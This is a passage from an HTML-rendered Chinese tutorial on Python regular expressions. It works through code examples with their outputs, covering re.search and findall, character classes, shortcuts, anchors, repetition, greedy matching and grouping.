class="comment">#第一题 获取&lt;span&gt;标签内的所有数据</span></span><br><span class="line">info = re.search(<span class="string">r&#x27;(?&lt;=&lt;span&gt;).*(?=&lt;/span&gt;)&#x27;</span>,str1)</span><br><span class="line">print(info.group(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#输出：name:张三,tel:18711001111</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#第二题:</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">提取手机号：（必须先清楚手机号的规则）</span></span><br><span class="line"><span class="string">    1.必须是11位的数字</span></span><br><span class="line"><span class="string">    2.第一位数字以1开头，第二位数字可以是[3,4,5,7,8]中的任意一个后面9个是[0-9]中的任意一个数字</span></span><br><span class="line"><span class="string">    （现在规则更多了，出现了19**的号码，这里作为例子就简单一点）；</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#第二题 提取所有手机号：</span></span><br><span class="line">phone = re.findall(<span class="string">r&#x27;1[345678]\d&#123;9&#125;&#x27;</span>,str1)</span><br><span class="line">print(phone)</span><br><span class="line"></span><br><span class="line"><span class="comment">#输出：[&#x27;18111234589&#x27;, &#x27;18711001111&#x27;]</span></span><br></pre></td></tr></table></figure><pre><code>name:张三,tel:18711001111name:张三,tel:18711001111[&#39;18111234589&#39;, &#39;18711001111&#39;]</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">使用正则表达式有两个常见的原因:</span></span><br><span class="line"><span class="string">    第一个原因是数据挖掘——也就是说，当我们希望在一大堆文本中找到一小堆文本，例如：身份证，手机号，e-mail等；</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    第二个原因是验证，可以使用正则表达式确认获得的数据是你所期望的，如用户验证，密码长度和格式的验证；</span></span><br><span class="line"><span class="string">re 模块</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#首先我们学习第一个函数，search()函数，它的目的是接收一个正则表达式和一个字符串，并返回发现的第一个匹配的字符串</span></span><br><span class="line"></span><br><span class="line">a = re.search(<span class="string">r&#x27;fox&#x27;</span>,<span class="string">&#x27;the quick brown fox jumpred&#x27;</span>)</span><br><span class="line"><span class="comment">#第一个参数为正则表达式，第二个参数为要处理的字符串</span></span><br><span class="line">print(a.span()) <span class="comment">#span方法获取的是正则表达式匹配到的位置,输出&#x27;(16,19)&#x27;</span></span><br><span class="line"></span><br><span class="line">b = re.search(<span class="string">r&#x27;www&#x27;</span>,<span class="string">&#x27;the quick brown fox jumpred&#x27;</span>)</span><br><span class="line">print(b) <span class="comment">#输出None</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><pre><code>(16, 19)None</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#找到多个匹配</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">re.search 的一个限制是它仅仅返回最近一个以 match 对象形式的匹配，如果在一个字符串内存在多个匹配，</span></span><br><span class="line"><span class="string">re.search()只会返回第一个匹配，一般情况下这也是我们期望的结果，但是，有时候需要当多个匹配存在时进行多个匹配。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">如果有这种需求咱们可以使用 findall 或者 finditer。</span></span><br><span class="line"><span class="string">两个方法的区别在于 findall 返回的是一个列表，</span></span><br><span class="line"><span class="string">finditer返回的是一个生成器</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">l = re.findall(<span class="string">r&#x27;张&#x27;</span>,<span class="string">&#x27;张三 张三丰 张无忌 张小凡&#x27;</span>)</span><br><span class="line">print(l)</span><br><span class="line"></span><br><span class="line"><span class="comment">#在这个例子中，我们会发现findall返回了所有匹配的值，这是因为“张”字在后面的字符串中出现了4次</span></span><br></pre></td></tr></table></figure><pre><code>[&#39;张&#39;, &#39;张&#39;, &#39;张&#39;, &#39;张&#39;]</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#基础正则表达式</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">最简单的正则表达式是哪些仅包含简单字母数字字符的表达式——不包含任何其他字符。</span></span><br><span class="line"><span class="string">字符串Python是一个有效的正则表达式，它仅匹配单词，默认正则表达式区分大小写，例如：</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">a = re.search(<span class="string">r&#x27;Python&#x27;</span>,<span class="string">&#x27;I Like python&#x27;</span>)</span><br><span class="line">print(a)</span><br><span class="line">b = re.search(<span class="string">r&#x27;Python&#x27;</span>,<span class="string">&#x27;I LIKE PYTHON&#x27;</span>)</span><br><span class="line">print(b)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">不过如果只是使用正则表达式来匹配文本，没有什么实际的意义，</span></span><br><span class="line"><span class="string">毕竟检测一个文本中是否有另一个字符串本来就非常简单。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">正则表达式强大的地方在于能够指定用于匹配的文本模式。</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><pre><code>NoneNone</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a = re.findall(<span class="string">r&#x27;[Pp]ython&#x27;</span>,<span class="string">&#x27;I Like Python3 and I like python2.7&#x27;</span>)</span><br><span class="line">print(a)</span><br><span class="line"></span><br><span class="line"><span class="comment">#可以发现[Pp]既可以匹配大写的P也可以匹配小写的p</span></span><br><span class="line"><span class="comment">#执行会发现输出为空数组，这里值的我们注意的是[Pp]仅匹配一个字符</span></span><br></pre></td></tr></table></figure><pre><code>[&#39;Python&#39;, &#39;python&#39;]</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#区间</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">有一些常见的字符组非常大，比如，我们要匹配的是任意数字，如果依照上述代码，</span></span><br><span class="line"><span class="string">每次我们都需要使用[0123456789] 这种方式明显很不明智，</span></span><br><span class="line"><span class="string">而如果要匹配从a-z的字母，我们也这样编写代码的话，肯定会让我们崩溃</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">为了适应这一点，正则表达式引擎在字符组中使用连字符(-)代表区间，</span></span><br><span class="line"><span class="string">所以我们匹配任意数字可以使用[0-9]，所以如果我们想要匹配所有小写字母，</span></span><br><span class="line"><span class="string">可以写成[a-z]，想要匹配所有大写字母可以写成[A-Z]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">可能我们还有个需求：匹配连字符。因为-在会被正则表达式引擎理解为代表连接区间，</span></span><br><span class="line"><span class="string">所以这个时候我们需要对-进行转义</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">a = re.findall(<span class="string">r&#x27;[0-9]&#x27;</span>,<span class="string">&#x27;xxx007abc&#x27;</span>)</span><br><span class="line">b = re.findall(<span class="string">r&#x27;[a-z]&#x27;</span>,<span class="string">&#x27;abc001ABC&#x27;</span>)</span><br><span class="line">c = re.findall(<span class="string">r&#x27;[A-Za-z0-9]&#x27;</span>,<span class="string">&#x27;abc007ABC&#x27;</span>)</span><br><span class="line">d = re.findall(<span class="string">r&#x27;[0-9\-]&#x27;</span>,<span class="string">&#x27;0edu 007-edu&#x27;</span>)</span><br><span class="line">print(a)</span><br><span class="line">print(b)</span><br><span class="line">print(c)</span><br><span class="line">print(d)</span><br></pre></td></tr></table></figure><pre><code>[&#39;0&#39;, &#39;0&#39;, &#39;7&#39;][&#39;a&#39;, &#39;b&#39;, &#39;c&#39;][&#39;a&#39;, &#39;b&#39;, &#39;c&#39;, &#39;0&#39;, &#39;0&#39;, &#39;7&#39;, &#39;A&#39;, &#39;B&#39;, &#39;C&#39;][&#39;0&#39;, &#39;0&#39;, &#39;0&#39;, &#39;7&#39;, &#39;-&#39;]</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#取反</span></span><br><span class="line">a = re.findall(<span class="string">r&#x27;[^0-9]&#x27;</span>,<span class="string">&#x27;xxx007abc&#x27;</span>)</span><br><span class="line">b = re.search(<span class="string">r&#x27;[^0-9]&#x27;</span>,<span class="string">&#x27;xxx007abc&#x27;</span>)</span><br><span class="line">print(a)</span><br><span class="line">print(b)</span><br><span class="line"><span class="comment">#可以通过在字符数组开头使用^字符实现取反操作，从而可以反转一个字符组（意味着会匹配任何指定字符之外的所有字符）</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">接下来在看一个表达式：n[^e] 这意味着字符n接下来的字符是除了e之外所有的字符</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">a = re.findall(<span class="string">r&#x27;n[^e]&#x27;</span>,<span class="string">&#x27;final&#x27;</span>)</span><br><span class="line">b = re.search(<span class="string">r&#x27;n[^e]&#x27;</span>,<span class="string">&#x27;final&#x27;</span>)</span><br><span class="line">c = re.findall(<span class="string">r&#x27;[n[^e]]&#x27;</span>,<span class="string">&#x27;Python&#x27;</span>)</span><br><span class="line">print(a)</span><br><span class="line">print(b)</span><br><span class="line">print(c)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">这里我们可以发现a和b匹配的是na，字符a因为不是e所以可以被匹配，</span></span><br><span class="line"><span class="string">而变量c的值为空，在这里正则表达式引擎只匹配到了字符串n的位置，</span></span><br><span class="line"><span class="string">而n之后没有任何可以匹配[^e]的字符了，所以这里也匹配失败</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><pre><code>[&#39;x&#39;, &#39;x&#39;, &#39;x&#39;, &#39;a&#39;, &#39;b&#39;, &#39;c&#39;]&lt;re.Match object; span=(0, 1), match=&#39;x&#39;&gt;[&#39;na&#39;]&lt;re.Match object; span=(2, 4), match=&#39;na&#39;&gt;[]</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#快捷方式</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">几种普通字符组还在正则表达式引擎中有几个预定义的快捷方式，如果我们想要定义单词，以目前学到的可能会使用[A-Za-z]，但是，很多单词都是使用该巨剑以外的字符。比如中文，以及其他语言，</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">正则表达式引擎提供了一些快捷方式：w ，与 “任意单词字符”匹配，在Python3中，基本上可以匹配任何语言的任意单词。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">而当我们想要匹配任意数字的时候也可以使用快捷方式 \d d即digit，在Python3中它除了可以和[0-9]匹配，还可以和其他语言的数字匹配。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">\s快捷方式匹配空白字符，比如空格，tab、换行 等。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">\b 快捷方式匹配一个长度为0的字符串，但是，他仅仅在一个单词开始或结尾处匹配，这被称为词边界快捷方式</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">快捷方式描述</span></span><br><span class="line"><span class="string">w与任意单词匹配</span></span><br><span class="line"><span class="string">d与任意数字匹配</span></span><br><span class="line"><span class="string">s匹配空白字符，比如空格 tab 换行 等</span></span><br><span class="line"><span class="string">b匹配一个长度为0的子串  #空字符</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#示例：</span></span><br><span class="line">a = re.findall(<span class="string">r&#x27;\w&#x27;</span>,<span class="string">&#x27;学好Python 大展拳脚&#x27;</span>) <span class="comment">#任意单词匹配</span></span><br><span class="line">b = re.search(<span class="string">r&#x27;\w&#x27;</span>,<span class="string">&#x27;python3&#x27;</span>) </span><br><span class="line">c = re.search(<span class="string">r&#x27;\d&#x27;</span>,<span class="string">&#x27;编号89757&#x27;</span>)</span><br><span class="line">print(a)</span><br><span class="line">print(b)</span><br><span class="line">print(c)</span><br><span class="line"><span class="comment">#这里findall会返回所有能匹配的值，search只会返回第一个匹配到的值</span></span><br><span class="line"></span><br><span class="line">d = re.findall(<span class="string">r&#x27;\bmaster\b&#x27;</span>,<span class="string">&#x27;masterxiao-master-xxx master abc&#x27;</span>)</span><br><span class="line">e = re.search(<span class="string">r&#x27;\smaster\s&#x27;</span>,<span class="string">&#x27;masterxiao master xxxx&#x27;</span>)</span><br><span class="line">print(d)</span><br><span class="line">print(e)</span><br></pre></td></tr></table></figure><pre><code>[&#39;学&#39;, &#39;好&#39;, &#39;P&#39;, &#39;y&#39;, &#39;t&#39;, &#39;h&#39;, &#39;o&#39;, &#39;n&#39;, &#39;大&#39;, &#39;展&#39;, &#39;拳&#39;, &#39;脚&#39;]&lt;re.Match object; span=(0, 1), match=&#39;p&#39;&gt;&lt;re.Match object; span=(2, 3), match=&#39;8&#39;&gt;[&#39;master&#39;, &#39;master&#39;]&lt;re.Match object; span=(10, 18), match=&#39; master &#39;&gt;</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#快捷方式取反</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">之前提到了取反，快捷方式也可以取反， </span></span><br><span class="line"><span class="string">例如对于 \w的取反为\W，可以发现将小写改写成大写即可。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">注意这里\B 有所不同， b 匹配的是在单词开始或结束位置长度为0的子字符串，</span></span><br><span class="line"><span class="string">而\B匹配不在单词开始和结束位置的长度为0的子字符串</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">a = re.findall(<span class="string">r&#x27;\Bmaster\B&#x27;</span>,<span class="string">&#x27;masterxiao master xxx master abc&#x27;</span>)</span><br><span class="line"></span><br><span class="line">b = re.search(<span class="string">r&#x27;master\B&#x27;</span>,<span class="string">&#x27;masterxiao&#x27;</span>)</span><br><span class="line"></span><br><span class="line">c = re.findall(<span class="string">r&#x27;\Bmaster\B&#x27;</span>,<span class="string">&#x27;1master1&#x27;</span>)</span><br><span class="line">print(a)</span><br><span class="line">print(b)</span><br><span class="line">print(c)</span><br></pre></td></tr></table></figure><pre><code>[]&lt;re.Match object; span=(0, 6), match=&#39;master&#39;&gt;[&#39;master&#39;]</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#字符串的开始和结束</span></span><br><span class="line"></span><br><span class="line">a = re.search(<span class="string">r&#x27;^python&#x27;</span>,<span class="string">&#x27;this code in python3&#x27;</span>)</span><br><span class="line">b = re.search(<span class="string">r&#x27;python$&#x27;</span>,<span class="string">&#x27;this code in python3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">c = re.search(<span class="string">r&#x27;^python&#x27;</span>,<span class="string">&#x27;python is my favorite&#x27;</span>)</span><br><span class="line">d = re.search(<span class="string">r&#x27;python$&#x27;</span>,<span class="string">&#x27;this is code in python&#x27;</span>)</span><br><span class="line"></span><br><span class="line">print(a)</span><br><span class="line">print(b)</span><br><span class="line">print(c)</span><br><span class="line">print(d)</span><br><span class="line"></span><br><span class="line"><span class="comment">#通过上述例子，我们可以发现 ^指定的是一个字符串的开始，$指定的是一个字符串的结束</span></span><br></pre></td></tr></table></figure><pre><code>NoneNone&lt;re.Match object; span=(0, 6), match=&#39;python&#39;&gt;&lt;re.Match object; span=(16, 22), match=&#39;python&#39;&gt;</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#任意字符</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">.字符最后一个快捷方式字符，它代表匹配任何单个字符，不过值得注意的是，它只能出现在方括号字符组以外</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">值得注意的是：&lt;font color = &quot;red&quot;&gt;.字符只有一个不能匹配的字符，</span></span><br><span class="line"><span class="string">也就是换行（\n），&lt;/font&gt;，不过让.字符与换行符匹配也是可能的，以后会讨论</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">a = re.search(<span class="string">r&#x27;p.th.n&#x27;</span>,<span class="string">&#x27;hello python re&#x27;</span>)</span><br><span class="line">b = re.search(<span class="string">r&#x27;p.....&#x27;</span>,<span class="string">&#x27;学好 python 人见人爱&#x27;</span>)</span><br><span class="line">print(a)</span><br><span class="line">print(b)</span><br><span class="line"></span><br></pre></td></tr></table></figure><pre><code>&lt;re.Match object; span=(6, 12), match=&#39;python&#39;&gt;&lt;re.Match object; span=(3, 9), match=&#39;python&#39;&gt;</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 可选字符</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">到目前为止，我们看到的正则表达式都是在正则表达式中的字符与被搜索的字符串中的字符保持1:1的关系。</span></span><br><span class="line"><span class="string">不过有时，我们可能想要匹配一个单词的不同写法，比如“color”和“colour”，或者“honor”与“honour”。</span></span><br><span class="line"><span class="string">这个时候我们可以使用 ? 符号指定一个字符、字符组或其他基本单元可选，这意味着正则表达式引擎将会期望该字符出现零次或一次</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">a = re.search(<span class="string">r&#x27;honou?r&#x27;</span>,<span class="string">&#x27;He Served with honor and distinction&#x27;</span>)</span><br><span class="line">b = re.search(<span class="string">r&#x27;honou?r&#x27;</span>,<span class="string">&#x27;He Served with honour and distinction&#x27;</span>)</span><br><span class="line">c = re.search(<span class="string">r&#x27;honou?r&#x27;</span>,<span class="string">&#x27;He Served with honou and distinction&#x27;</span>)</span><br><span class="line"></span><br><span class="line">print(a)</span><br><span class="line">print(b)</span><br><span class="line">print(c)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">可以发现，在上述三个例子中，正则表达式为honou?r，这里可以匹配的是 honor 和 honour 不能匹配 honou，</span></span><br><span class="line"><span class="string">可以知道的是 ? 确定了前一个u是可选的，在第一个示例中，没有u，是没有问题可以匹配的，</span></span><br><span class="line"><span class="string">在第二个示例中，u存在这也没有问题。在第三个例子中，u存在但是r不存在，这样就不能匹配了</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><pre><code>&lt;re.Match object; span=(15, 20), match=&#39;honor&#39;&gt;&lt;re.Match object; span=(15, 21), match=&#39;honour&#39;&gt;None</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 重复</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">到目前为止，我们只是学习了关于仅出现一次的字符串匹配，在实际开发过程中，这样肯定不能满足需求，比如要匹配电话号码，比如匹配身份证号，这些都是很多个数字组成的。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">如果遇到这样的情况，我们可能期望一个字符组连续匹配好几次。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">在正则表达式在一个字符组后加上&#123;N&#125; 就可以表示 &#123;N&#125; 之前的字符组出现N次</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">re.findall(<span class="string">r&#x27;[\d]&#123;4&#125;-[\d]&#123;7&#125;&#x27;</span>,<span class="string">&#x27;张三：0731-8825951，李四：0733-8794561&#x27;</span>)</span><br></pre></td></tr></table></figure><pre><code>[&#39;0731-8825951&#39;, &#39;0733-8794561&#39;]</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#重复区间</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">可能有时候，我们不知道具体要匹配字符组要重复的次数，比如身份证有15位也有18位的。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">这里重复区间就可以出场了，语法：&#123;M,N&#125;，M是下界而N是上界</span></span><br><span class="line"><span class="string">举个例子：</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">a = re.search(<span class="string">r&#x27;[\d]&#123;3,4&#125;&#x27;</span>,<span class="string">&#x27;0731&#x27;</span>)</span><br><span class="line">b = re.search(<span class="string">r&#x27;[\d]&#123;3,4&#125;&#x27;</span>,<span class="string">&#x27;073&#x27;</span>)</span><br><span class="line">print(a)</span><br><span class="line">print(b)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">通过上述代码，我们发现[\d]&#123;3,4&#125; 既可以匹配3个数字也可以匹配4个数字，</span></span><br><span class="line"><span class="string">不过当有4个数字的时候，优先匹配的是4个数字，这是因为正则表达式默认是贪婪模式，</span></span><br><span class="line"><span class="string">即尽可能的匹配更多字符，而要使用非贪婪模式，我们要在表达式后面加上 ?号</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">d = re.search(<span class="string">r&#x27;[\d]&#123;3,4&#125;?&#x27;</span>,<span class="string">&#x27;0734&#x27;</span>)</span><br><span class="line">e = re.search(<span class="string">r&#x27;[\d]&#123;2,3&#125;?&#x27;</span>,<span class="string">&#x27;073&#x27;</span>)</span><br><span class="line">print(d)</span><br><span class="line">print(e)</span><br></pre></td></tr></table></figure><pre><code>&lt;re.Match object; span=(0, 4), match=&#39;0731&#39;&gt;&lt;re.Match object; span=(0, 3), match=&#39;073&#39;&gt;&lt;re.Match object; span=(0, 3), match=&#39;073&#39;&gt;&lt;re.Match object; span=(0, 2), match=&#39;07&#39;&gt;</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#开闭区间</span></span><br><span class="line"><span class="comment">#有时候我们可能遇到字符组的重复次数没有边界：</span></span><br><span class="line"><span class="comment">#闭区间不写即可表示匹配一个或多个。</span></span><br><span class="line">a = re.search(<span class="string">r&#x27;[\d]&#123;1,&#125;&#x27;</span>,<span class="string">&#x27;0731 xxx&#x27;</span>)</span><br><span class="line">print(a)</span><br></pre></td></tr></table></figure><pre><code>&lt;re.Match object; span=(0, 4), match=&#39;0731&#39;&gt;</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#速写</span></span><br><span class="line"><span class="comment">#还可以使用两个速写字符指定常见的重复情况，</span></span><br><span class="line"><span class="comment">#可以使用 + 匹配1个或多个，</span></span><br><span class="line"><span class="comment">#使用 *代表0个或多个</span></span><br><span class="line">a = re.findall(<span class="string">r&#x27;[\d]+&#x27;</span>,<span class="string">&#x27;0731-8859456&#x27;</span>)</span><br><span class="line">b = re.findall(<span class="string">r&#x27;[\d]*&#x27;</span>,<span class="string">&#x27;编号89758&#x27;</span>)</span><br><span class="line">print(a)</span><br><span class="line">print(b)</span><br></pre></td></tr></table></figure><pre><code>[&#39;0731&#39;, &#39;8859456&#39;][&#39;&#39;, &#39;&#39;, &#39;89758&#39;, &#39;&#39;]</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#分组</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">在Python正则中还提供了一种机制将表达式——分组，当使用分组时，</span></span><br><span class="line"><span class="string">除了获得整个匹配。还能够在匹配中选择每一个分组。</span></span><br><span class="line"><span 